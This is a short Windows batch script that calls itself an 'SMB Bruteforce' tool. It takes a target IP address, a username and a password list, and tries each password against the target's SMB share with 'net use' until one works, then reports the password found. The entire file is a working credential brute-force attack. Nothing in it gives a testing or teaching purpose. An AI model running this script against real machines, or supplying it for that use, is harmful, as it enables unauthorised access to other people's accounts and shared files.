@echo off
title SMB Bruteforce - by Hayshemi
color 5
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "
echo.

setlocal enabledelayedexpansion
set count=0

for /f %%a in (%wordlist%) do (
    set /a count+=1
    set pass=%%a
    call :attempt
)
echo.
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found on attempt !count!: %pass%
pause
exit

:attempt
echo Attempt !count!: %pass%
net use \\%ip% /user:%user% %pass% >nul 2>&1
if %errorlevel% EQU 0 goto success
exit /b